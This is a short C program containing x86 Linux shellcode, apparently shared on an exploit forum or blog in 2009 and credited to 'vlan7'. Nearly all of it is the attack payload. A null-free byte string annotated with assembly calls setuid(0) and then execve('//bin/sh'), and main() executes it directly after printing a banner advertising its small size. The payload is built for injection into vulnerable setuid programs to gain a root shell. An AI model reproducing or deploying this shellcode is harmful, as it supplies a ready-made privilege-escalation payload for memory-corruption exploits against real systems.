#include <stdio.h>

const char sc[]= "\x31\xdb" //xor ebx,ebx
                 "\x8d\x43\x17" //LEA eax,[ebx + 0x17] /LEA is FASTER tha push/pop
                 "\x99" //cdq
                 "\xcd\x80" //int 80 //setuid(0) shouldn't returns -1 right? ;)
                 "\xb0\x0b" //mov al,0bh
                 "\x52" //push edx /Termina la cadena //bin/sh con un 0
                 "\x68\x6e\x2f\x73\x68"
                 "\x68\x2f\x2f\x62\x69"
                 "\x89\xe3" //mov ebx,esp
                 "\x89\xd1" //mov ecx,edx
                 "\xcd\x80"; //int 80h

int main()
{
  printf("\nSMALLEST SETUID & EXECVE GNU/LINUX x86 STABLE SHELLCODE "
        "WITHOUT NULLS THAT SPAWNS A SHELL"
                        "\n\nCoded by vlan7"
                        "\n\t + vlan7[at]bigfoot.com"
                        "\n\t + http://vlan7.blogspot.com"
                        "\n\n[+] Date: 4/Jul/2009"
                        "\n[+] Thanks to: sch3m4. He initiated the funny game."
                        "\n\n[+] Shellcode Size: %d bytes\n\n",
                        sizeof(sc)-1);
        (*(void (*)()) sc)();
        return 0;
}